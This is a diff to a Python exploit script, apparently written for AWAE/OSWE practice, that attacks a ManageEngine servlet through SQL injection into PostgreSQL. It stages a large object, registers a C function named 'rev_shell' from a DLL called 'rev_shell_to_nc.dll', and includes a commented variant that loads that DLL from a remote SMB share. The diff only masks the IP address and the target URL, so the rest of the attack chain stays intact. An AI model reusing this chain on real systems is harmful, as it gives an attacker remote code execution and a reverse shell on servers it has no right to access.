@@ -89,7 +89,7 @@ def create_udf_func(url,file):
     print("[+] Creating function...")
     sql = "create or replace function rev_shell(text, integer) returns VOID as $$%s$$, $$awae$$ language C strict" % file
     #SAMBA file server
-    #sql = "create or replace function rev_shell(text, integer) returns VOID as $$\\192.168.45.197\awae\rev_shell_to_nc.dll$$, $$awae$$ language C strict"
+    #sql = "create or replace function rev_shell(text, integer) returns VOID as $$\\192.xxx.xxx.197\awae\rev_shell_to_nc.dll$$, $$awae$$ language C strict"
     make_request(url, sql)
 
 def trigger_udf(url, ip, port):
@@ -99,7 +99,7 @@ def trigger_udf(url, ip, port):
 
 dll_file_path = '/home/kali/awae/rev_shell_to_nc.dll'
 #test_pgsleep(url)
-url = 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet'
+url = 'https://xxx:8443/servlet/xxxxxServlet'
 dll_file = 'C:\\rev_shell_to_nc.dll'#save to c drive for eazy-e access
 unlink_lo(url) #unlink it to make sure it does not exist
 create_lo(url,1337) #create temp large object with c:\windows\win.ini <- AssUming its there
